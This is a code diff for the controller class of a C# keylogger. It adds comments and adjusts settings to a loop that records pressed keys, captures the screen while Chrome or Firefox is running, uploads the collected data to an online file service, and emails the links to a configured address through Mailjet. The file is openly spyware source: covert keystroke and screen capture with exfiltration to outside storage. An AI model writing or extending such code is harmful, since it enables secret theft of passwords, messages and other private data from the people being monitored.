@@ -11,6 +11,9 @@ using System.Windows.Input;
 
 namespace Keylogger
 {
+    /// <summary>
+    /// Controlls flow of the keylogger
+    /// </summary>
     public class Controller
     {
         // Processes names or empty if we want to make screenshots all the time
@@ -19,17 +22,17 @@ namespace Keylogger
             "chrome",
             "firefox"
         });
-        private readonly int ImageSnapshotInterval = 3000;
-        private readonly int UploadMinInterval = 30000;
-        private readonly int MaxUploadSizeMB = 10;
-        private readonly IOnlineService[] OnlineServices = new IOnlineService[]
+        private readonly int ScreenSnapshotInterval = 3000; // Interval for getting screen snapshots
+        private readonly int UploadMinInterval = 30000; // Interval of determining whether local storage is full and upload should be made
+        private readonly int MaxUploadSizeMB = 100;      //  After reaching this size, upload should be made
+        private readonly IOnlineService[] OnlineServices = new IOnlineService[]   // Online storages for uploading gathered data
         {
             new ExpireBox()
         };
-        private readonly string MailJetPublicKey = "";
-        private readonly string MailJetPrivateKey = "";
-        private readonly IMailProvider Mailprovider;
-        private readonly string TargetMail = "mail@example.com";
+        private readonly string MailJetPublicKey = "";        // Public key for Mailjet service - sending mail
+        private readonly string MailJetPrivateKey = "";       // Public key for Mailjet service - sending mail
+        private readonly IMailProvider Mailprovider;          // Mail provider for sending mails
+        private readonly string TargetMail = "mail@example.com";  // Mail where links to gathered data will be sent
 
 
 
@@ -42,6 +45,9 @@ namespace Keylogger
 
 
 
+        /// <summary>
+        /// Starts infinite run of the keylogger
+        /// </summary>
         public void StartMonitor()
         {
             DataSource dataSource = new DataSource();
@@ -50,13 +56,13 @@ namespace Keylogger
             int milisecondsSlept = 0;
             while (true)
             {
-                // Process keys
+                // Get pressed keys and saves them
                 List<Key> pressedKeys = dataSource.GetNewPressedKeys();
                 if (pressedKeys.Any())
                     localStorage.SaveKeys(pressedKeys);
 
-                // Process images - but not every milisecond
-                if (milisecondsSlept % ImageSnapshotInterval == 0)
+                // Make screen snapshots - but not every milisecond
+                if (milisecondsSlept % ScreenSnapshotInterval == 0)
                 {
                     // We dont'want to track specified process - make a capture
                     if (!TrackedProcesses.Any())
@@ -88,7 +94,7 @@ namespace Keylogger
                     Mailprovider.SendMail(TargetMail, "KeyLogger", String.Join("\r\n", urls));
                 }
 
-                // Sleep
+                // Sleep for one milisend
                 Thread.Sleep(1);
 
                 // Prevent integer overflow
@@ -99,12 +105,16 @@ namespace Keylogger
 
 
 
+        /// <summary>
+        /// Functions check whether internet connection is available by checking google.com
+        /// </summary>
+        /// <returns>True if internet connection is up</returns>
         private bool InternetWorks()
         {
             try
             {
                 using (WebClient wc = new WebClient())
-                    wc.DownloadString("https://www.google.cz/");
+                    wc.DownloadString("https://www.google.com/");
 
                 return true;
             }
